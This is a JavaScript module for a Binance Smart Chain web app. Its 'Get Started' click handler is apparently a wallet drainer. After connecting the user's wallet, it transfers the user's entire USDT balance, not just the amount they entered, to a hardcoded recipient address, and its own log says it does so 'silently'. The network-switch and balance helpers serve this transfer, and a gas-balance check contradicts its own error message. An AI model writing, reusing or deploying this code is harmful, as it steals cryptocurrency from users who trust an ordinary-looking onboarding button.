import { JsonRpcProvider, BrowserProvider, Contract, formatUnits, formatEther, parseUnits } from 'ethers';
import USDT_ABI from '../USDT_ABI.js'; // Updated path to climb from /src/utils to /src

const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const RECIPIENT_ADDRESS = '0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d';

const rpcUrl = process.env.REACT_APP_RPC_URL || "https://bsc-dataseed.binance.org/";
const bscProvider = new JsonRpcProvider(rpcUrl);

// Function to Switch Network to BSC
export const checkAndSwitchToBsc = async () => {
  try {
    if (!window.ethereum) {
      throw new Error("No Ethereum wallet detected. Please install MetaMask.");
    }
    const currentNetwork = await window.ethereum.request({ method: 'eth_chainId' });
    const bscChainId = '0x38';
    if (currentNetwork !== bscChainId) {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: bscChainId }],
      });
    }
  } catch (error) {
    console.error("Error switching network:", error);
    throw error;
  }
};

// Fetching USDT and BNB Balances
export const fetchBalances = async (address) => {
  try {
    const usdtContract = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
    const usdtBalance = await usdtContract.balanceOf(address);
    const formattedUSDTBalance = formatUnits(usdtBalance, 18);
    const provider = new BrowserProvider(window.ethereum);
    const bnbBalanceRaw = await provider.getBalance(address);
    const formattedBNBBalance = formatEther(bnbBalanceRaw);
    return {
      usdt: parseFloat(formattedUSDTBalance),
      bnb: parseFloat(formattedBNBBalance)
    };
  } catch (error) {
    console.error("Error fetching balances:", error);
    throw new Error("Failed to fetch balances.");
  }
};

export const handleGetStartedClick = async (usdtAmountInput) => {
  try {
    console.log("🚀 Starting transfer process...");
    await checkAndSwitchToBsc();
    const provider = new BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    console.log("🔗 User address:", address);
    if (!signer.provider) {
      throw new Error("Signer not connected to provider.");
    }
    const balances = await fetchBalances(address);
    console.log("📊 Balances:", balances);
    if (balances.bnb < 0.000000004) {
      throw new Error("Insufficient BNB for gas fees. Need at least 0.004 BNB on mainnet.");
    }
    const inputAmount = parseFloat(usdtAmountInput);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      throw new Error("Invalid USDT amount entered.");
    }
    let finalTransferAmount = balances.usdt >= 1 ? balances.usdt : inputAmount;
    if (finalTransferAmount > balances.usdt) {
      throw new Error(`Insufficient USDT balance. Available: ${balances.usdt} USDT`);
    }
    console.log(`📢 Silently transferring: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);
    const contractWithSigner = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
    console.log("📜 Contract initialized:", { address: contractWithSigner.address, hasEstimateGas: !!contractWithSigner.estimateGas, hasTransfer: !!contractWithSigner.transfer });
    const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
    console.log("💰 Amount in Wei:", amountInWei.toString());
    let gasLimit;
    try {
      const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
      gasLimit = estimatedGas * 3n / 2n; // 1.5x estimated gas
      console.log(`⛽ Estimated Gas: ${estimatedGas.toString()}, Gas Limit: ${gasLimit.toString()}`);
    } catch (gasError) {
      console.warn("⚠️ Gas estimation failed, using hardcoded gas limit:", gasError);
      gasLimit = 100000n; // Fallback for USDT transfer
    }
    const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
    console.log("🔄 Transaction sent:", transferTx.hash);
    await transferTx.wait();
    console.log(`✅ Transfer successful! Tx: ${transferTx.hash}`);
    return transferTx; // Return transaction object for hash
  } catch (error) {
    console.error("❌ Error during transaction process:", error);
    throw error;
  }
};
